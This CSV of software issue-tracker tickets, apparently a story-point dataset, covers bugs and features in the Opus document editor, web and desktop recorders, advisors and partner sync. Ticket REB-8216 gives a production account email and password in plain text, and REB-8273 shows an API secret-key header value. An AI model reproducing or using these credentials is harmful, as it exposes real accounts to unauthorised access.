issuekey,title,description,storypoint
REB-8445,Problem on migration API for document contexts,"There is a problem on the migration API to add steps for current document contextsv2/document_contexts/migrate/steps?isForHost=true (POST)Some document branches with ""imported"" status are not migrated successfullyYou can find the errors on Graylog with this traceid ""0HLSFNSNBSVES:00000001""",3
REB-8443,Content Editor - Edits not saved when closing browser tab,"One of the AC for REB-7731 is ""Edits should save at a 100% success rate - including scenarios when: user quickly closes the tab.Any edits made after last auto-save and closing the browser tab are not saved.Steps to reproduce1) Log in to Opus Customer Account2) Navigate to Content Manager3) Select desired Content and open in Editor4) Make desired edit (for example, move control area on a step image)5) Immediately close browser tab6) Re-open Content from step 3 and verify edit is savedExpected behavior: edits made after last auto-save action and closing Editor browser tab are savedActual behavior: edits made after last auto-save action and closing Editor browser tab are NOT saved [^Editor - Close Browser Edits Not Saved.mp4] ",2
REB-8442,STAGE - INVESTIGATE - Unable to open Public Library Content in Editor,One of the testers logged in as Epilogue Root Admin is unable to open ANY Content in Public Library. Two other testers are able to open Content in Public Library. Please investigate and determine why this is happening.Username: msmith_pr_esadmin@epiloguesystems.com [^2020-01-04-1737-53.flv] ,2
REB-8441,STAGE Web Advisor - Not triggering matching content due to blank captions on contexts.,"As a user using Web Advisor, I can NOT see any matching documents although the contexts is correct completely in comparison with website's one. The causes is that we *did not validate NULL captions* *on the back-end side* so that it leads to an error in displaying matching documents.*Expectation*: We should have a null-caption validation to avoid unexpected errors when users get matches.",2
REB-8440,"Opus Web Recorder, Advisor: Don't use All URL's  and http://*/*"", ""https://*/*"" at a time","In section content_script in mainfest.json We are using *All URL's and http://*/*"", ""https://*/*"" at a time* that are not necessary, we should only use Any host (""<all_urls>"")",2
REB-8436,Book Manager - Left menu/sidebar does not load,"From Book Manager, when user opens a book in edit mode, the left menu/sidebar displays the skeleton but never loads. This behavior is reproducible in STAGE and QA, but is not reproducible in PROD.+STAGE Customer Accounts+Benni Boy IndustriesAll Access+QA Customer Account+Remote Testers",2
REB-8435,Cloned document missing steps when original document is missing a context,"Steps to reproduce:1. Choose existing recording with existing steps3. Choose the document branch select the Clone actionResult: The newly cloned document has NO steps at all. The original document will still work as expected.* Resolve the bug so that I am able to correctly clone the document from a branchNote: This can be reproduced in Dev, QA, and Stage!be07c65d-fbce-4a6f-af6c-2e8a4e1819fd|width=1914,height=1010!",2
REB-8434,Editor - Do not apply 'Save' function to 4 buttons when all steps are not fully loaded.,"On the Editor, if all steps are not fully loaded, we click on every single button: Save and Close, Complete, Record New Steps, Preview. The new branch will not be commited on Git. So that task will be error.Solution: Do not apply 'Save' function to 4 buttons when all steps are not fully loaded. Just allow 'Save' function after all steps are loaded.",2
REB-8413,Don't allow to commit the empty steps to Git,Currently we have some documents that can’t access to edit or view because they have blank step in Git. The root cause is The steps of the document is wiping the content and then committing empty step to Git. To prevent this we will need to check empty step before we commit to Git.*Updated*:User can create recording with empty stepsUser can remove all steps manually in Document EditorWe don’t allow to update with empty steps in other cases,3
REB-8411,Document Editor - Front-end issue after deleting all steps in document.,"As a user accessing Editor, I should not see any errors after my attempt to delete ALL steps.*Actuality:* it throws error immediately after steps are deleted completely.!8411iss.wmv|width=640,height=360!*Expectation:* The step list should be blank instead of loading incorrectly.",1
REB-8410,Context Editor - Problems after importing documents.,"As a user importing files, there are two problems that need resolving after importing file successfully:*1)* I could not see step numbers belonging to each steps.!image-20191230-031452.png|width=1907,height=777!*2)* When I make a change on context, document opens a branch. However, I could not see my change saved. There is no any context displayed.!8410iss.wmv|width=640,height=360!*Expectation:* The step number and context should be recovered fully and correctly.",2
REB-8399,Content Manager filter - Choosing an application makes buttons begin a new line.,"As an *Epilogue Admin* accessing to Content Manager page, when I choose an application to filter results, the position of filter buttons is changed. This is a CSS issue impacted by the way we handled Custom Attribute filter of *Customer Admin.*!image-20191225-103902.png|width=1914,height=1002!*Expectation:* Their position should be fixed.",1
REB-8398,Content Manager - There is an error when publishing a branch of document,"Steps to reproduce:# Login to Opus.# Choose Contents tab.# Choose Content Manager.# Choose a document and edit.# On Editor, choose a step and delete Advisor Context.# Click on Save and Close button.# Back to the Content Manager.# Publish new branch of that document which was edited.Actual: The system will show an error message after publishing a documentExpected: Should fix to have no error when publishing.Note: This issue only happen with heavy document (over 50 steps)",2
REB-8395,NHA - Error when publishing some branches,"In the NHA account in production, there are many documents (10+) that have a branch that cannot be published. Most of these documents were recorded in July or previous, but have been published successfully many times since then (as early as last week).When the client attempts to publish the branch, nothing happens and we can see an error in Graylog:https://logs.27global.com/messages/graylog_263/ab7c4010-2364-11ea-b38a-12777fd9bb64*Here is the view from content manager:* !image-2019-12-20-15-16-21-887.png|thumbnail! In the Database, we can see this document and the matching branch ID: !image-2019-12-20-15-17-05-241.png|thumbnail! When I open the branch in the editor, it loads without issue, which suggests it's not an issue with GIT: !image-2019-12-20-15-18-14-449.png|thumbnail! * Identify the source of the error and suggest method to resolve the issue manually (if possible)* Address the root cause so that the issue doesn't appear again",2
REB-8392,Implement prototype Web Recorder functionality,"After the prototype Web Recorder completed in REB-5219 to more accurately capture screenshots, we need to apply this approach to the existing Web Recorder (with all enhancements since) and test to ensure all functionality is working as expected.* Apply approach from REB-5219 to most current Web Recorder and verify screenshot capture logic is updated so that images do not mismatch with steps when recording quickly.",13
REB-8347,Customer list - Plan names are not sorted.,"As an Epilogue Admin or Support User accessing Customer list page, I should have the ability to sort data in each column.*Actuality:* there is no any order for sorting Plan names.!image-20191219-034400.png|width=1906,height=973!*Expectation:* ""Plan"" column should have the ability to be sorted as others in page.",1
REB-8314,"Account Status should only be ""Active"" after all setup is complete","As any account owner that registers for Opus, I have to complete all the customer setup screens before my account should be set to ""Active"". This includes the password setup, department, applications, etc. Only when I have access to see the dashboard should my account be set to Active.* Adjust when the account status is changed to active** The account owner must complete ALL setup steps before the account is set to active (ie. when they arrive at the dashboard)",1
REB-8309,Customer Admin - setup screen appears - DLZP on Prod,"As a customer admin in the DLZP account in Prod (*Note:* this issue does *_not_* appear when you are managing the account from Epilogue root), when I log in or attempt to edit a task, the account setup screen appears, then goes away, and I am redirected to the Dashboard.Here's how this is *currently* working for the DLZP account in Production. [^Unable to Edit Content.docx]Not sure if this is relevant, but their trial recently expired and afterwards they were put on a different billing plan (they are currently ‘active’ on the ‘Full Access’ billing plan). They have space for more users / power users and I don’t know of any other issue with their account.I have only tested this with a customer admin user in their account, it might be worthwhile to also test as power user and content user to see if the issue recurs as those roles.* Resolve issue with authorization flow that is redirecting users away from the account setup page when accessing Editor, Viewer, etc.** If the account setup screen is needed based on the existing logic, then users should be navigated to this screen for completion before any redirection.",2
REB-8304,Remove stripe.net source code by nuget,"We need to remove stripe.net from source code by using nuget, it will help to maintain easily.",5
REB-8303,STAGE - PDF issues.,"As users accessing eAssistant window, when having a matching PDF file, I should be navigated to a new tab in portal to view it.*Actuality:* It navigates to an incorrect URL so that I can not view the content.!image-20191213-103743.png|width=1128,height=490!Also, in Content page, when clicking on an PDF file, it is downloaded automatically. This is incorrect.!image-20191213-103911.png|width=1679,height=908!*Expectation:* The correct URL should be [https://s3-us-west-2.amazonaws.com/opus-west.system/stag/opus/pdf/fe39fcaf67f64f9388096895d73f7406.pdf|https://s3-us-west-2.amazonaws.com/opus-west.system/stag/opus/pdf/fe39fcaf67f64f9388096895d73f7406.pdf] I can view PDF content normally in a new tab.",3
REB-8302,UserAppService.cs:Refactor this method to reduce its Cognitive Complexity from 49 to the 15 allowed.,public async Task<PagedResultDto<UserListDto>> FindAllUser(FindUserFilter filter),1
REB-8301,Choose Existing Content - UI Improvement,"1.Make filtering area look a bit better!picturemessage_nqccgo2c.m3u.png|width=1139,height=602!2.Unexpected scrollbarWe are seeing an unexpected outer-scrollbar.!image-20191219-031415.png|width=1847,height=909!{color:#ff5630}*Note*{color}: make sure that these changes above are also applied for screen below:!image-20191219-031909.png|width=1909,height=904!",2
REB-8300,UserCustomAttributeAppService.cs: Refactor this method to reduce its Cognitive Complexity from 136 to the 15 allowed,"private List<UserCustomAttributeDto> CheckMappingData(List<UserCustomAttributeDto> metadataAttributes, List<UserCustomAttributeDto> tmpListCustomAttributes)",1
REB-8299,UserCustomAttributeAppService.cs: Refactor this method to reduce its Cognitive Complexity from 42 to the 15 allowed.,public async Task<IList<UserCustomAttributeDto>> GetMatchingCustomAttributeByUsers(List<long> userIds),1
REB-8297,UserAppService.cs: Refactor this method to reduce its Cognitive Complexity from 49 to the 15 allowed.,"  public async Task<IActionResult> InviteUser(InviteModel model, bool isInviteSsoUser)",1
REB-8295,UserAppService.cs: Refactor this method to reduce its Cognitive Complexity from 52 to the 15 allowed.,"public async Task<IActionResult> UpdateMultiUsersProfile(UpdateMultiUsersDto model, bool isBulkInvite = false)Refactor this method to reduce its Cognitive Complexity from 52 to the 15 allowed.",1
REB-8294,UserAppService.cs: Refactor this method to reduce its Cognitive Complexity from 69 to the 15 allowed.," public async Task<IActionResult> UpdateUserProfile(UpdateUserProfileDto model, bool isBulkInvite = false)",1
REB-8293,BulkInviteUserAppService.cs: Refactor this method to reduce its Cognitive Complexity from 334 to the 15 allowed,"public async Task<List<UpdateUserProfileDto>> ValidateRowData(List<BulkError> bulkErrors, List<string> rowHeader, List<List<string>> rowsData, List<UserDetailDto> userInfos, List<OrganizationUnit> tenantDepartments, List<Category> tenantApplications, List<CustomAttribute> tenantAttributes, List<CustomAttributeApplication> attributesApplications",2
REB-8290,Editor - Mismatch in location of Control Area on Editor vs. Viewer,"This bug is related to REB-7911.  We updated the width of the control area line to 2 pixels in Editor and 1 pixel in viewer, but it does not correspond EXACTLY from the Viewer. The Control area on the Viewer/PDF should be the “inside perimeter” of the box.*Viewer:*!image-2019-12-12-16-07-33-208.png|width=200,height=183! *Viewer/PDF* - You can see that the bottom part of the box is up 2 pixels and the right-side is left 2 pixels - The top and left-side look good.!image-2019-12-12-16-07-57-183.png|width=200,height=183! ",1
REB-8278,Email Preferences - Content User should not have Email Preferences option ,"When a Content User is not a member of a project team, the Email Preferences option in the settings menu should not display.Steps to reproduce1) Log in as Customer Admin and invite new Content User2) Complete registration for new Content User3) Click username/avatarExpected result: Email Preferences is not an option in the menuActual result: Email Preferences is an option in the menu !image-2019-12-11-10-55-50-339.png|thumbnail! ",1
REB-8276,List files/Search - Show correct file number,"These pages were missed on the work done for REB-7751:Choose Existing Content (Tasks)Comment QueueFrom original ticket:As a user, viewing a list of files (through Search or otherwise) in screens such as Content list, Content Manager, etc. if there are more files than 20, it shows the number of files as 20 and updates as I scroll down.We would prefer it shows the correct number of files the first time, or shows the number listed out of the total number (such as 20/78, if 78 were the total number).",3
REB-8273,Create APIs to update the document contexts,"We need to create 3 API:1. An API to get the contexts list base on documentId* The result should include: BranchId, StepId, ContextId, URL, Caption, Process, AditionalContext2. An API to update contexts base on the BranchId, ContextIds* This API will update the context for specific context item base on the ContextIDs list on the parameter.* We need to update the context on all place that it is stored:** DocumentContexts table** Git** Elastic Search** S33. Another API to create a new manual context for a branchNotes:* If the document is published, we don’t want it to be re-published. So keep the version and the status of the branch* Also, we need to create a confluence page to explain why the contexts are storing on these places above.*Update for the APIs instructions:**Api #1**URL*: v2/document/\{documentId}/contexts*Method*: GET*Headers*:* SecrectKey : bGFtYmRhLWRldi1ldmVuOlZJZjM4WThKeWVRc2FjY1NjTVE5(example)*Api #2**URL*: v2/update_contexts*Method*: PUT*Headers*:* SecrectKey : bGFtYmRhLWRldi1ldmVuOlZJZjM4WThKeWVRc2FjY1NjTVE5(example)*Body:*(example){noformat}[         {            ""branchId"": 130646,            ""stepId"": ""057d98f7-45dd-4d25-824e-8e78d5f38e35"",            ""caption"": ""Planning  Execution 1"",            ""url"": null,            ""processName"": ""MICROSOFT.DYNAMICS.NAV.CLIENT.EXE"",            ""additionalContext"": null,            ""id"": 90682        },                 {            ""branchId"": 130647,            ""stepId"": ""057d98f7-45dd-4d25-824e-8e78d5f38e35"",            ""caption"": ""Planning  Execution 2"",            ""url"": null,            ""processName"": ""MICROSOFT.DYNAMICS.NAV.CLIENT.EXE"",            ""additionalContext"": null,            ""id"": 90682        }]{noformat}*Api #3**URL*: v2/add_contexts*Method*: POST*Headers*:* SecrectKey : bGFtYmRhLWRldi1ldmVuOlZJZjM4WThKeWVRc2FjY1NjTVE5(example)*Body:*(example){noformat}[        {            ""branchId"": 140660,            ""caption"": ""a1"",            ""url"": ""a1"",            ""processName"": ""a1"",            ""additionalContext"": ""a1"",        },        {            ""branchId"": 140661,            ""caption"": ""a2"",            ""url"": ""a2"",            ""processName"": ""a2"",            ""additionalContext"": ""a2"",        }]{noformat}",5
REB-8272,Epilogue Root / session being lost,"As an Epilogue root user, I can navigate to any screen, hit 'enter' on the URL, and when the screen reloads I will be forced to log back in to my Epilogue root account.Found this in Prod and Stage.STR:1. log in to opuseps.com2. Navigate anywhere, such as https://opuseps.com/app/host/customer3. Click on the URL field and hit 'enter'4. After the screen reloads, you will be redirected to loginAlso your session is not retained if you click on links to locations in the same browser.STR1. log in to opuseps.com2. Put https://opuseps.com/app/host/customer into a new tab, or else just click on https://opuseps.com/app/host/customer from a different tab3. Since the new tab is from the same browser, I should be using the same token and authorized to view Opuseps.com, but I'm not - I'm redirected to login",2
REB-8271,Import Manager / Legacy (.rstx) Import - convert processname value to SPECIALBROWSER,"As a power user or admin, importing legacy (.rstx) files, the processname attribute for some of these files may be set to values that don't work properly in Opus.These values may include 'SPECIALBROWSERPROCESSNAME' 'iexplore.exe' 'CHROME.EXE' 'firefox.exe'They should all be converted to 'SPECIALBROWSER' when the rstx file is imported to Opus.",3
REB-8269,Contents - Filtering by Author does not change results,"When filtering by Author, no change is made to the resulting Content list. NOTE: cursory testing of other Advanced Filter options returned expected results.*Steps to recreate*1)  User navigates to CONTENT MANAGER page and identifies published CONTENT, notes the Author and count of published CONTENT for each author. 2)  User then navigates to CONTENTS page and verifies the number of published CONTENT available equals the number of published CONTENT listed on CONTENT MANAGER page.3) User selects Advanced Filters option and selects an author identified at step 1 in the filter; user executes the filter.Expected behavior: only CONTENT authored by the name selected in Author field of Advanced Filters displayActual behavior: all published CONTENT continues to display [^Contents Page_Author Filter Does Not Filter List.mp4] December Release - REB-7740",3
REB-8216,Web Advisor - Injected window blank on Fullstory and Asana,"The client experienced an issue today with web advisor where the injected panel appears blank even when there are documents that match the page (lightbulb flashed correctly). They were using the ""Company"" account in production.You can use my credentials in this account if needed to reproduce, but Please *do not change or add any documents*tray.ailshie+company@27global.com, Hello@12341. On the homepage of Asana, the client was able to get the lightbulb to flash, but the injected panel was empty (I was NOT able to reproduce this on Asana). The client had just signed into the advisor this morning, so it doesn’t appear to be token related.!image (2).png|width=3081,height=2035!!image (3).png|width=3081,height=2035!2. In Fullstory, the client was able to get the same issue when viewing a session detail. I WAS able to reproduce this behavior by clicking in the window to dismiss the fullstory session detail. It appears the javascipt triggered causes our content to disappear. See the video below.!ded5623c-4f2b-42df-837a-231344f46f47|width=1898,height=990!The client was able to get this working as normal again, but we need to ensure the web advisor is stable and predictable.* Resolve the cause of the issue in full story causing the content to disappear from the panel.* Investigate if this issue could cause the behavior experienced in Asana as well",3
REB-8190,Partner page does not display Customer list.,"As an Epilogue Admin, I should have the ability to see available partner customer admins.*Actuality:* When expanding the customer list, I always see that there are no customers being available although there are some existing tenants.!image-20191209-063248.png|width=1913,height=1001!!image-20191209-063330.png|width=1900,height=1003!*Expectation:* I should see the customers which are available in Partner site. ",2
REB-8189,Partner site - seeing token in URL when impersonating a Partner Admin,"As an Epilogue Admin in Opus site impersonating a Partner, I should not see the token attached in URL!image-20191209-062534.png|width=1912,height=1004!*Expectation:* I should not see the token attached in URL when impersonating a Partner.",3
REB-8186,Partner Public Library - Partner Admins are not allowed to edit documents synced from Epilogue site.,"As a Partner Admin interacting with published documents, I should NOT the ability to edit synced documents.*Actuality:* With a synced document, I can do anything on it such as edit document, change context, delete document,.... They are actions creating a branch for documents in Partner site. If synced documents open branches, those will be completely different documents in synchronizing perspective.*Expectation:* * Partner Admin are only allowed to *view content* and *information* and the ability to *download documents*.* In right-click menu, reject other options that lead synced documents to create a branch.",3
REB-8185,Partner Public Library - the ability to sync multiple documents.,"As a Partner Admin experiencing Public Library, documents should be synced to my site if an Epilogue Admin publishes multiple documents.*Actuality:* I only have the ability to publish one document each time to avoid facing with a failed process. If the number of documents I am going to publish at the same time is 10, nothing is synced to Partner site.*Expectation:** If an Epilogue Admin publishes multiple documents, all should be synced to Partner site successfully correctly.* Make sure that the information of documents is correct in Partner site after the sync process. ",5
REB-8184,Add steps for current context,"As request from [~accountid:557058:296e7719-bc31-44fd-bbe8-881189084f8b], we should save the steps in the context which we saved for each document.AC: when changing the context of each step in document, the step number should be updated in the distinct contexts in the databaseMigrate old document data",8
REB-8180,Upgrade .NET CORE to LTS version,# Epilogue site:## Billing## Impersonate tenant## Application language## Public library## Project/task## Application info## Public library theme## HTML element## EULA## Epilogue user management## Customer list## Reset password## My profile## Invite new tenant# Customer## Register or Invite new tenant## Billing## Task## Project## Account info## Content list and content manager## import RSTX/OPSX/Odarc and external docs## Getting started for customer admin/content user and PO## Dashboard## Doctypes## API settinga## SSO## Customer metadata## Book## Bulk user## Learning activity## Target application## Sisence system## Embedded System## Snippet advisor## Forgot password## Login with incorrect username/password ## Login with user that is not existed in the system# Web recorder# Desktop recorder# Web advisor# Desktop advisor# Partner,3
REB-8179,Editor - title in step menu should match step instruction,"As an Editor, editing a step instruction, changing the text in the step instruction should change the title in the step menu right away (after I click away or a second or two has elapsed to ensure I am done changing it).*Currently* changing text in the step instruction has no effect on the text in the step menu until I change to the Edit details view for the step instruction, then changes there will cause the title in the step menu to update.So if I change the text in the step instruction, nothing happens on the left:!string input step instruction text.png|width=200,height=183! If I then go to the Edit details view (click on the pencil icon) and change some fields, eventually the step menu will update. But it shouldn't require this.*Proposed* changing text in the step instruction, after the editor has clicked off the field, changed steps, or simply waits a few seconds to confirm they are done editing, will be reflected in the step menu on the left right away.If I then go to the 'Edit details' view (click the pencil icon) and change the step in that view, the step menu on the left should reflect what I'm doing there instead.In both cases, we need the step menu on the left to reflect the result of the most recent fields changed by the Editor.*Update -* as per [~accountid:5aabb0d7378b7e2a4de0adda] this issue only seems to occur with ‘type’ actions that result in a step instruction with a table. So we will change the requirements like this:If the step instruction contains a table, no need to update the step menu each time step instruction is changed, unless it is changed in the Edit Details screen.*However*, if the table in the step instruction is removed, we will immediately update the step menu to reflect the content of the step instruction, as if it is any other step. If the step table is restored (through Restore Default or some other method), we will go back to the previous behavior.",5
REB-8177,Advisor - no message if there is no matching book,"As a user using Advisor applications, there should be a message notifying there is no matching book.*Actuality:* If I don't have any matching book, I'm currently seeing a blank pages*Expectation:* It should have a sample message. For example, ""There are no book matches at this time"". This should applied for * Web Advisor* Desktop Advisor* Embedded Widget",2
REB-8175,My Profile - hide 'Show Opus Suggestions' for Content Users,"As a content user who is not a member of a project team (see [REB-7784] for detail), I shouldn't see Opus Help Suggestions no matter what, so the checkbox 'Show Opus Suggestions' in the My Profile screen should be suppressed for me.Please suppress the checkbox and the label 'Show Opus Suggestions' for content users who are not members of a project team.",1
REB-8174,Chrome Advisor - can't inject panel,"As a user of Chrome Advisor, anywhere in the https://www.graybar.com/ site (for example https://www.graybar.com/store/en/gb/cabinets-enclosures-and-racks/enclosures or https://www.graybar.com/store/en/gb) if you try to open the Chrome Advisor panel you see this and it doesn't change: !graybar_panel.jpg|thumbnail! This is a serious problem -if Chrome Advisor has an issue injecting it's supposed to open in a new window instead. We need to either fix the issue blocking it from appearing and working properly in this web application, or else we need to detect the code on the webpage causing the problem and open it in a new eAssistant panel instead (the standard fallback for any failure to inject).",2
REB-8173,Settings > Supported Countries - Cannot add Country,"As an Epilogue Admin, I need to be able to add countries to the Supported Countries through Settings. When attempting to add a country, I receive an error message: !image-2019-12-04-08-37-16-692.png|thumbnail! Steps to reproduce1) Log in to Epilogue root account as Admin2) Select Settings > Country Settings > Supported Countries > Add Country3) Enter required information and click ADD COUNTRY buttonExpected behavior: message displays informing the Country has been addedActual behavior: Error message displays",2
REB-8172,Partner: Update eAssistant to be able to work for partner,"We will need a mechanism to partner to be able to call to existing eAssistant.* Add a parameter  to eAssistant url when calling from Portal, DesktopApp.* Update code on eAssistant to identify the parameter to Call to the api of partner exactly.",3
REB-8170,"Tasks - investigate error in publishing task, editing task, for Success Hero","Attempting to publish the task 'email test from a task' in the 'Email Test' project in the Success Hero account on Production results in this error: !publish_error.jpg|thumbnail! In addition, attempting to open this task for editing -  'This is a new task' in the 'Email Test' project in the Success Hero account on Production results in this error: !edit_error.jpg|thumbnail! traceid: 0HLRMD3UT6BCB:0000000Aoccurred 10:11am CST on 12/3/2019Please investigate these errors. Are they due to an issue with the task data, or is there a problem with the customer account?",3
REB-8169,Impersonating - Account Logo is not changed,"After impersonating a tenant in panel, I should see the correct account logo of that tenant.*Actuality:* It is always the logo of account logging in at the beginning of Web Advisor usage !image-2019-12-03-19-08-37-119.png|thumbnail!  !image-2019-12-03-19-09-03-493.png|thumbnail! *Expectation:* The accoutn logo should be got correctly.",1
REB-8168,Context Editor - Steps being in a group or fork are not counted.,Steps are grouped or put in a fork should be counted as step numbers in Context Editor page*Actuality: *these are not counted. !image-2019-12-03-15-25-13-033.png|thumbnail!  !image-2019-12-03-15-25-32-614.png|thumbnail! *Expectation:* They should be counted as normal step numbers,1
REB-8167,Create 404 Landing Page,"When a user goes to a page that doesn't exist, it loads a blank page.  CloudFront redirects 404 errors to /index.html and returns a 200 status.  If you go to opuseps.com/index.html or dev-opuseps.com/index.html, it loads a blank page.  If you go to opuseps.com/thisisnotarealpage, you will get a blank page.  Users' old cache can cause a 404 error which returns a blank white page.  We should create a 404 landing page that directs the user to the login screen or at least tells them they're having a 404 error and maybe clearing their cache might fix the issue.I'm not very familiar with Angular, but we could be having routing issues with angular?Is CloudFront setup correctly?The caching issue will be another ticket but this could help users if they experience a caching problem. Success criteria: Users are presented with a informative 404 page or are properly redirected if they receive a 404 error. ",2
REB-8160,Task - Publish Task - Need visual indicator that Task is being published,"When moving a Task to Published state, the PUBLISH CONTENT button becomes disabled and remains disabled until Task is published. User is then redirected to Project Details page.!Publish Task Visual Indication of Publishing Action.mp4|thumbnail!Rather than this lack of visual indication, we should change PUBLISH CONTENT button to CONTENT PUBLISHING while it is disabled after user chooses to publish (and before user is redirected to Project Details screen).",3
REB-8156,Context Editor - no validation check when having Additional Context field,Below is my caseMy document has two contextsContext 1: -Caption: Hello-URL: hello.com-Process: SPECIALBROWSER-Additional Context: *AAA*Context 2:-Caption: Hello-URL: hello.com-Process: SPECIALBROWSER-Additional Context: *AAA**Actuality:* there is no validation check although we easily see these are the same contexts*Expectation:* we should check the validation to ensure the contexts are different to save the change successfully.,1
REB-8155,Context Editor - Incorrect result when editing multiple rows,"When I edit rows in Context Editor page, I get a correct result.In detalis, I edit these 2 rows respectively but these are combined into 1 row after saving the change.See my video below: [^khuong issue.wmv] *Expectation:* It should be two different rows",3
REB-8154,Desktop Recorder - there is no message if there are no any tasks. ,"As a user using Desktop Recorder, I should see a message when my account does not have any tasks in My Tasks page.*Actuality:* It is a grey page now.!image-20191128-073536.png|width=1336,height=744!*Expectation:* It should show the message below.!image-20191128-073704.png|width=1354,height=763!We already have had CSS elements from Web Recorder to handle this.!image-20191128-073835.png|width=520,height=244!",1
REB-8153,Custom Metadata - Power User is not navigated to Update Metadata page when having new metadata.,"As a Customer Admin adding new metadata, Power Users should be required to complete metadata (except for Optional ones) after logging in.*Actuality:* Power User does not navigate to Metadata page after logging in successfully. Content User flow is still correct.*Expectation:* Power User can navigate to Metadata page as Content User did.",1
